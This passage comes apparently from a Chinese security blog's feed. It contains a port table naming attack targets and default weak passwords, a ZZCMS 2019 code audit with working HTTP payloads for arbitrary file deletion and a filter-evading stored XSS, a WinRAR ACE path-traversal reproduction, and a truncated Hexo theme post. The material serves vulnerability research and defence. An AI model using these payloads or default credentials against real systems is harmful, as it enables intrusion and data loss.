远程类</td><td></td></tr><tr><td>端口</td><td>功能及注意事项</td></tr><tr><td>—————-</td><td>————————————————————</td></tr><tr><td>21</td><td>FTP服务端口，改成动态端口，做访问控制</td></tr><tr><td>22</td><td>SSH远程管理的默认端口，可利用远程执行代码、暴力密码破解、以及<code>DDOS</code>攻击，建议保持SSH版本为最新版本，更改成其他端口号，增强账户登录密码强度或更换为密钥登录，做访问控制</td></tr><tr><td>23</td><td>Telnet远程管理默认端口，没啥特殊用途就索性关了吧</td></tr><tr><td>3389</td><td>RDP远程桌面端口，建议同21</td></tr><tr><td>4899</td><td>Radmin软件远程管理通信端口，建议同21</td></tr><tr><td>5631</td><td>pcanywhere软件远程管理通信端口，建议同21</td></tr><tr><td>5900、5901</td><td>VNC软件远程管理通信端口，建议同21</td></tr><tr><td>6000</td><td>X-windows软件远程管理通信端口，建议同21</td></tr></tbody></table><h1 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h1><h2 id="1、web类-web漏洞-敏感目录"><a href="#1、web类-web漏洞-敏感目录" class="headerlink" title="1、web类(web漏洞/敏感目录)"></a>1、web类(web漏洞/敏感目录)</h2><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>80</td><td>web</td></tr><tr><td>80-89</td><td>web</td></tr><tr><td>8000-9090</td><td>web</td></tr></tbody></table><h2 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>1433</td><td>MSSQL</td></tr><tr><td>1521</td><td>Oracle</td></tr><tr><td>3306</td><td>MySQL</td></tr><tr><td>5432</td><td>PostgreSQL</td></tr><tr><td>50000</td><td>DB2</td></tr></tbody></table><h2 id="3、特殊服务类-未授权-命令执行类-漏洞"><a href="#3、特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3、特殊服务类(未授权/命令执行类/漏洞)"></a>3、特殊服务类(未授权/命令执行类/漏洞)</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>443</td><td>SSL心脏滴血</td></tr><tr><td>445</td><td>ms08067/ms11058/ms17010等</td></tr><tr><td>873</td><td>Rsync未授权</td></tr><tr><td>5984</td><td>CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a></td></tr><tr><td>6379</td><td>redis未授权</td></tr><tr><td>7001,7002</td><td>WebLogic默认弱口令，反序列</td></tr><tr><td>9200,9300</td><td>elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</td></tr><tr><td>11211</td><td>memcache未授权访问</td></tr><tr><td>27017,27018</td><td>Mongodb未授权访问</td></tr><tr><td>50000</td><td>SAP命令执行</td></tr><tr><td>50070,50030</td><td>hadoop默认端口未授权访问</td></tr></tbody></table><h2 id="4、常用端口类-扫描弱口令-端口爆破"><a href="#4、常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令/端口爆破)"></a>4、常用端口类(扫描弱口令/端口爆破)</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>21</td><td>ftp</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Telnet</td></tr><tr><td>445</td><td>SMB弱口令扫描、MS08-067、MS17-010</td></tr><tr><td>2601,2604</td><td>zebra路由，默认密码zebra</td></tr><tr><td>3389</td><td>远程桌面</td></tr></tbody></table><h2 id="5、端口合计所对应的服务"><a href="#5、端口合计所对应的服务" class="headerlink" title="5、端口合计所对应的服务"></a>5、端口合计所对应的服务</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>21</td><td>ftp</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Telnet</td></tr><tr><td>25</td><td>SMTP</td></tr><tr><td>53</td><td>DNS</td></tr><tr><td>69</td><td>TFTP</td></tr><tr><td>80</td><td>web</td></tr><tr><td>80-89</td><td>web</td></tr><tr><td>110</td><td>POP3</td></tr><tr><td>135</td><td>RPC</td></tr><tr><td>139</td><td>NETBIOS</td></tr><tr><td>143</td><td>IMAP</td></tr><tr><td>161</td><td>SNMP</td></tr><tr><td>389</td><td>LDAP</td></tr><tr><td>443</td><td>SSL心脏滴血以及一些web漏洞测试</td></tr><tr><td>445</td><td>SMB</td></tr><tr><td>512,513,514</td><td>Rexec</td></tr><tr><td>873</td><td>Rsync未授权</td></tr><tr><td>1025,111</td><td>NFS</td></tr><tr><td>1080</td><td>socks</td></tr><tr><td>1158</td><td>ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案</td></tr><tr><td>1433</td><td>MSSQL (暴力破解)</td></tr><tr><td>1521</td><td>Oracle:(iSqlPlus Port:5560,7778)</td></tr><tr><td>2082/2083</td><td>cpanel主机管理系统登陆 （国外用较多）</td></tr><tr><td>2222</td><td>DA虚拟主机管理系统登陆 （国外用较多）</td></tr><tr><td>2601,2604</td><td>zebra路由，默认密码zebra</td></tr><tr><td>3128</td><td>squid代理默认端口，如果没设置口令很可能就直接漫游内网了</td></tr><tr><td>3306</td><td>MySQL （暴力破解）</td></tr><tr><td>3312/3311</td><td>kangle主机管理系统登陆</td></tr><tr><td>3389</td><td>远程桌面</td></tr><tr><td>3690</td><td>svn</td></tr><tr><td>4440</td><td>rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</td></tr><tr><td>4848</td><td>GlassFish web中间件 弱口令:admin/adminadmin</td></tr><tr><td>5432</td><td>PostgreSQL</td></tr><tr><td>5900</td><td>vnc</td></tr><tr><td>5984</td><td>CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a></td></tr><tr><td>6082</td><td>varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</td></tr><tr><td>6379 r</td><td>edis未授权</td></tr><tr><td>7001,7002</td><td>WebLogic默认弱口令，反序列</td></tr><tr><td>7778</td><td>Kloxo主机控制面板登录</td></tr><tr><td>8000-9090</td><td>都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</td></tr><tr><td>8080</td><td>tomcat/WDCd/ 主机管理系统，默认弱口令</td></tr><tr><td>8080,8089,9090</td><td>JBOSS</td></tr><tr><td>8081</td><td>Symantec AV/Filter for MSE</td></tr><tr><td>8083</td><td>Vestacp主机管理系统 （国外用较多）</td></tr><tr><td>8649</td><td>ganglia</td></tr><tr><td>8888</td><td>amh/LuManager 主机管理系统默认端口</td></tr><tr><td>9000</td><td>fcgi fcig php执行</td></tr><tr><td>9043</td><td>websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager</td></tr><tr><td>9200,9300</td><td>elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</td></tr><tr><td>10000</td><td>Virtualmin/Webmin 服务器虚拟主机管理系统</td></tr><tr><td>11211</td><td>memcache未授权访问</td></tr><tr><td>27017,27018</td><td>Mongodb未授权访问</td></tr><tr><td>28017</td><td>mongodb统计页面</td></tr><tr><td>50000</td><td>SAP命令执行</td></tr><tr><td>50060</td><td>hadoop</td></tr><tr><td>50070 50030</td><td>hadoop默认端口未授权访问</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZZCMS2019版 代码审计记录</title>
      <link href="/p/9812.html"/>
      <url>/p/9812.html</url>
      
        <content type="html"><![CDATA[<p>ZZCMS2019版本代码审计记录</p><a id="more"></a><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>官网下载<a href="http://www.zzcms.net/about/6.htm" target="_blank" rel="noopener">http://www.zzcms.net/about/6.htm</a></p><h1 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h1><p><code>step1.php</code>中会检测是否存在<code>install.lock</code>，存在则显示已经安装过，否则跳出判断，执行正常安装</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">"install.lock"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;div style='padding:30px;'&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/IwcYFcO.png" alt=""></p><p>但是该判断只在<code>step1.php</code>中存在，<code>step2.php,step3.php,step4.php</code>均不存在该代码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/3Uu0tpL.png" alt="step2.php"></p><p><code>step3.php</code>中设置了<code>token</code>，计算方式是：使用<code>rand()</code>生成一个随机数，然后以这个随机数作为前缀生成23位的唯一<code>ID</code>，然后再进行<code>md5</code>加密确保唯一性。</p><blockquote><p><code>uniqid(prefix,more_entropy)</code>函数基于以微秒计的当前时间，生成一个唯一的 ID。</p><p>如果 <code>prefix</code>参数为空，则返回的字符串有 13 个字符串长。如果 <code>more_entropy</code>参数设置为 true，则是 23 个字符串长。</p><p>如果<code>more_entropy</code> 参数设置为 true，则在返回值的末尾添加额外的熵（使用组合线形同余数生成程序），这样可以结果的唯一性更好。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/rSPg1hK.png" alt="step3.php"></p><p><code>index.php</code>中定义了<code>$step</code>变量获取方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_cache_limiter(<span class="string">'private, must-revalidate'</span>);  <span class="comment">//为了支持返回上一步页面回跳,//要放在session_start之前</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION))&#123;session_start();&#125; </span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="comment">//set_magic_quotes_runtime(0);//5.3后已不在支持</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../inc/config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);<span class="comment">//把数组中的键名直接注册为了变量。就像把$_POST[ai]直接注册为了$ai。</span></span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">$submit = <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>因此重装漏洞可以通过<code>post</code><strong>step</strong>值进行触发</p><p><img src= "/img/loading.gif" data-lazy-src="/images/Mn1ZkmD.png" alt=""></p><h1 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h1><p>前提：需要后台权限</p><p>漏洞位置:<code>/admin/dl_data.php</code>第12行开始</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    $action = $_REQUEST[<span class="string">'action'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action == <span class="string">"del"</span>) &#123;</span><br><span class="line">    $fp = <span class="string">"../dl_excel/"</span> . $_GET[<span class="string">"filename"</span>];</span><br><span class="line">    <span class="keyword">if</span> (file_exists($fp)) &#123;</span><br><span class="line">        unlink($fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请选择要删除的标签');history.back()&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>$_GET[&quot;filename&quot;]</code>直接get方式取得<code>filename</code>，没有经过过滤，导致可跨目录任意删除文件</p><p>Payload:</p><blockquote><p>GET /admin/dl_data.php?action=del&amp;filename=../robots.txt HTTP/1.1<br>Host: <a href="http://www.zzcms2019.cc" target="_blank" rel="noopener">www.zzcms2019.cc</a><br>Proxy-Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36<br>DNT: 1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Cookie: PHPSESSID=pfaouuq82dnb11vske0ahqr7f2; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; tablename=zzcms_zsclass</p></blockquote><p>访问后，根目录下的<code>robots.txt</code>已被删除</p><h1 id="存储型XSS（CVE-2019-9078）"><a href="#存储型XSS（CVE-2019-9078）" class="headerlink" title="存储型XSS（CVE-2019-9078）"></a>存储型XSS（CVE-2019-9078）</h1><p>细读了下源码，发现在<code>/user/ask.php</code>中存在<code>modify()</code>函数,部分代码如下</p><p>以<code>get</code>方法获取<code>do</code>参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$do=<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])?$_GET[<span class="string">'do'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">switch</span> ($do) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"add"</span>:add();<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"modify"</span>:modify();<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>modify()</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modify</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $username; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div class="admintitle"&gt;修改问答信息&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page = <span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])?$_GET[<span class="string">'page'</span>]:<span class="number">1</span>;</span><br><span class="line">    checkid($page);</span><br><span class="line">    $id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])?$_GET[<span class="string">'id'</span>]:<span class="number">0</span>;</span><br><span class="line">    checkid($id, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    $sqlzx=<span class="string">"select * from zzcms_ask where id='$id'"</span>;</span><br><span class="line">    $rszx =query($sqlzx);</span><br><span class="line">    $rowzx = fetch_array($rszx);</span><br><span class="line">    <span class="keyword">if</span> ($id&lt;&gt;<span class="number">0</span> &amp;&amp; $rowzx[<span class="string">"editor"</span>]&lt;&gt;$username) &#123;</span><br><span class="line">        markit();</span><br><span class="line">        showmsg(<span class="string">'非法操作！警告：你的操作已被记录！小心封你的用户及IP！'</span>);</span><br><span class="line">    &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中调用了存在问题的函数<code>markit()</code></p><p>函数所在文件<code>/inc/function.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$_SERVER['HTTP_REFERER'];//上页来源</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $userip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">    <span class="comment">//$userip=getip();</span></span><br><span class="line">    $url = <span class="string">"http://"</span> . $_SERVER[<span class="string">'HTTP_HOST'</span>] . $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">    query(<span class="string">"insert into zzcms_bad (username,ip,dose,sendtime)values('"</span> . $_COOKIE[<span class="string">"UserName"</span>] . <span class="string">"','$userip','$url','"</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">"')"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>$url</code>没有经过过滤，直接插入数据库，因此我们可以注册一个用户，访问 <code>http://www.zzcms2019.cc/user/ask.php?do=modify&amp;page=1&amp;id=1</code>，会出现</p><p><img src= "/img/loading.gif" data-lazy-src="/images/5JxxULl.png" alt=""></p><p>这时我们可以用Burpsuite抓包，修改包体的URI路径为<code>/user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=&lt;sCrIpT&gt;alert(/xss/)&lt;/ScRiPt&gt;</code></p><p>使用<code>&lt;sCrIpT&gt;alert(/xss/)&lt;/ScRiPt&gt;</code>是因为在<code>/inc/stopsqlin.php</code>中有一段检测函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//主要针对在任何文件后加?%3Cscript%3E，即使文件中没有参数</span></span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'REQUEST_URI'</span>],<span class="string">'script'</span>)!==<span class="keyword">false</span> || strpos($_SERVER[<span class="string">'REQUEST_URI'</span>],<span class="string">'%26%2399%26%'</span>)!==<span class="keyword">false</span>|| strpos($_SERVER[<span class="string">'REQUEST_URI'</span>],<span class="string">'%2F%3Cobject'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span> (<span class="string">"无效参数"</span>);<span class="comment">//注意这里不能用js提示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/H67jYWx.png" alt=""></p><p>完整包体如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;user&#x2F;ask.php?do&#x3D;modify&amp;page&#x3D;1&amp;id&#x3D;1&amp;aaa&#x3D;&lt;sCrIpT&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;ScRiPt&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: www.zzcms2019.cc</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: __tins__713776&#x3D;%7B%22sid%22%3A%201551009070949%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201551010962798%7D; __51cke__&#x3D;; __51laig__&#x3D;12; bdshare_firstime&#x3D;1551002231060; PHPSESSID&#x3D;8o9ms5t57q6dag7ofku75fn2j7; UserName&#x3D;test; PassWord&#x3D;e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>当管理员访问后台中的<strong>用户→用户不良操作记录</strong>时</p><p><img src= "/img/loading.gif" data-lazy-src="/images/VMs1r1r.png" alt=""></p><p>即可触发</p><p><img src= "/img/loading.gif" data-lazy-src="/images/MtBdViP.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR 远程代码执行漏洞复现</title>
      <link href="/p/1951.html"/>
      <url>/p/1951.html</url>
      
        <content type="html"><![CDATA[<p>WinRAR系列任意代码执行漏洞(CVE-2018-20250、CVE-2018-20251、CVE-2018-20252与CVE-2018-20253)复现</p><a id="more"></a><h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>WinRAR 作为最流行的解压缩软件，支持多种压缩格式的压缩和解压缩功能。今天，Check Point公司的安全研究员 Nadav Grossman 公开了他在 WinRAR 中发现的一系列漏洞。其中以 ACE 解压缩模块的远程代码执行漏洞（CVE-2018-20250）最具危害力。<br>WinRAR 为支持 ACE 压缩文件的解压缩功能，集成了一个具有 19 年历史的动态共享库 <code>unacev2.dll</code>。 而此共享库自 2006 年以来再未更新过，也未开启任何漏洞利用缓解技术。Nadav Grossman 在 unacev2.dll 中发现了一个目录穿越漏洞，成功利用此漏洞可导致远程代码执行或 NTLM hash 泄露。</p><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p>影响版本：</p><blockquote><p>WinRAR &lt; 5.70 Beta 1<br>Bandizip    &lt; = 6.2.0.0<br>好压(2345压缩)    &lt; = 5.9.8.10907<br>360压缩    &lt; = 4.0.0.1170</p></blockquote><h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><p>该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。</p><p>主要所需工具<code>WinACE</code>、<code>010Editor</code>。</p><h2 id="3-1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。"><a href="#3-1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。" class="headerlink" title="3.1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。"></a>3.1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。</h2><p>安装WinACE<br><img src= "/img/loading.gif" data-lazy-src="/images/4EXOh4m.png" alt="安装WinACE"><br>新建文本文件<br><img src= "/img/loading.gif" data-lazy-src="/images/fO5cyZG.png" alt="新建文本文件"><br>然后利用WinACE进行压缩。<br><img src= "/img/loading.gif" data-lazy-src="/images/DIdK6Z2.png" alt="WinACE进行压缩"><br>然后我们下载acefile.py 脚本。</p><blockquote><p>下载地址为:<br><a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">https://github.com/droe/acefile/blob/master/acefile.py</a></p></blockquote><p>使用命令<code>python acefile.py --headers testfile.ace</code>来读取该文件头信息。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/VlpAP9x.png" alt="读取该文件头信息"></p><p>根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。</p><p>用<code>010editor</code>打开该文件。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/IeVvnxj.png" alt=""></p><p>需要看选中的部分。<br>对比acefile解析的结果，并明白各个段对应的内容。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/ofCS3YD.png" alt=""></p><p>如果要修改<code>filename</code>，则需要修改上面标注这几处。第一处为<code>0x20EE(hdrcrc)</code>,第二处为<code>0x002B(hdrsize)</code>，第三处为<code>0x000C(filename的长度）</code>，以及最后一处为filename。</p><p>修改顺序是由后到前。</p><p>这里修改<code>filename</code>为<code>g:\g:\testsp4ce.txt</code>（<strong>图中D盘因开启了防护软件被拦截了，下文中的d都为g盘</strong>）</p><p>长度为<code>19</code>，对应的hex为<code>0x0013</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/JtgcTUf.png" alt=""></p><p>然后修改<code>hdr_size</code>，长度为<code>50</code>，对应的hex为<code>0x0032</code>。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/xI2gMw7.png" alt=""></p><p>接下来就是修改<code>hdr_crc</code>了，这里有一个取巧的方法。</p><p>我们再次运行命令<code>python acefile.py --headers testfile.ace</code></p><p>程序中断并提示<code>CorruptedArchiveError: header CRC failed</code>和正确的<code>CRC</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/mHkYCIg.png" alt=""></p><p>最后改完如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/oBvtki7.png" alt=""></p><p>再次查看，可以正常解析，并看到filename已经修改成功</p><p><img src= "/img/loading.gif" data-lazy-src="/images/m0ZsPMQ.png" alt=""></p><p>右键解压到<code>testfile\</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/z3MZ1bQ.png" alt=""></p><p>即可在g盘看到解压出的<code>testsp4ce.txt</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/z9yE9WC.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>经测试，winrar 5.4在解压恶意压缩包时，压缩包在任意目录均可解压触发，且右键的2个解压选项均可触发</p><p><img src= "/img/loading.gif" data-lazy-src="/images/XZ5CSOb.png" alt=""></p><h1 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h1><ol><li>升级WinRAR到5.70beta1</li><li>删除解压软件下的<code>UNACEV2.DLL</code></li></ol><h1 id="0x05-用到的文件"><a href="#0x05-用到的文件" class="headerlink" title="0x05 用到的文件"></a>0x05 用到的文件</h1><p>Github:<a href="https://github.com/NS-Sp4ce/BlogFiles/tree/master/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/BlogFiles/tree/master/CVE-2018-20250</a></p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO的Material主题折腾记</title>
      <link href="/p/4135750794.html"/>
      <url>/p/4135750794.html</url>
      
        <content type="html"><![CDATA[<p>博客自从11月换了个主题后就一直在断断续续的折腾，开个文章记录下折腾日志</p><a id="more"></a><h1 id="首页部分更改"><a href="#首页部分更改" class="headerlink" title="首页部分更改"></a>首页部分更改</h1><h2 id="更改LOGO下的图标"><a href="#更改LOGO下的图标" class="headerlink" title="更改LOGO下的图标"></a>更改LOGO下的图标</h2><p>文件路径<code>\hexo\blog\themes\material\layout\index.ejs</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;i class&#x3D;&quot;material-icons&quot; role&#x3D;&quot;presentation&quot;&gt;view_carousel&lt;&#x2F;i&gt;</span><br><span class="line">&lt;i class&#x3D;&quot;material-icons&quot; role&#x3D;&quot;presentation&quot;&gt;more_vert&lt;&#x2F;i&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;i class&#x3D;&quot;material-icons&quot; role&#x3D;&quot;presentation&quot;&gt;pages&lt;&#x2F;i&gt;</span><br><span class="line">&lt;i class&#x3D;&quot;material-icons&quot; role&#x3D;&quot;presentation&quot;&gt;share&lt;&#x2F;i&gt;</span><br></pre></td></tr></table></figure><p>效果图<br><img src= "/img/loading.gif" data-lazy-src="/images/nSGClOf.png" alt=""></p><h2 id="首页文章加标签"><a href="#首页文章加标签" class="headerlink" title="首页文章加标签"></a>首页文章加标签</h2><p>路径<code>\hexo\blog\themes\material\layout\_partial\Paradox-post-info.ejs</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% if (post.categories &amp;&amp; post.categories.length) &#123; %&gt;</span><br><span class="line">    &lt;!-- Category --&gt;</span><br><span class="line">    &lt;span class&#x3D;&quot;post_entry-category&quot;&gt;</span><br><span class="line">        &lt;%- list_categories(post.categories, &#123;</span><br><span class="line">            show_count: false,</span><br><span class="line">            class: &#39;post_category&#39;,</span><br><span class="line">            style: &#39;none&#39;</span><br><span class="line">        &#125;) %&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- tags --&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;post_entry-right-info-Tags&quot;&gt;</span><br><span class="line">  &lt;i class&#x3D;&quot;material-icons&quot;&gt;bookmark_border&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;%- list_tags(post.tags, &#123;</span><br><span class="line">                  show_count: false,</span><br><span class="line">                  class: &#39;post-tag&#39;,</span><br><span class="line">                  style: &#39;none&#39;</span><br><span class="line">              &#125;) %&gt;</span><br><span class="line"> &lt;&#x2F;span&gt;</span><br><span class="line">  &lt;!-- Category --&gt;</span><br><span class="line">  &lt;span class&#x3D;&quot;post_entry-right-info-Category&quot;&gt;</span><br><span class="line">      &lt;i class&#x3D;&quot;material-icons&quot;&gt;folder_open&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;%- list_categories(post.categories, &#123;</span><br><span class="line">                  show_count: false, </span><br><span class="line">                  class: &#39;post-category&#39;,</span><br><span class="line">                  style: &#39;none&#39;</span><br><span class="line">              &#125;) %&gt;</span><br><span class="line">  &lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure><p>效果图<br><img src= "/img/loading.gif" data-lazy-src="/images/SjrKLsD.png" alt=""></p><h2 id="底部添加访客数、运行时间站点字数"><a href="#底部添加访客数、运行时间站点字数" class="headerlink" 